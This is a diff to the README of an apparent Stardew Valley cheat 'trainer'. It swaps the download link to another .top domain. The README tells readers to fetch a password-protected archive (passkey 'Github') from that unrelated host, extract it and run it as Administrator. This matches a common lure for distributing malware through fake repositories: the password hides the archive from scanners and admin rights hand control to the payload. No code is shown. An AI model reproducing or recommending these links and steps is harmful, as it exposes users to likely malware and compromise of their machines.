@@ -6,7 +6,7 @@ Stardew Valley trainer with unlimited health, stamina, gold, instant tool upgrad
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -69,7 +69,7 @@ Based on popular mods like **SMAPI** and **CJB Cheats Menu**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Stardew Valley.
 4. Run the trainer **as Administrator**.
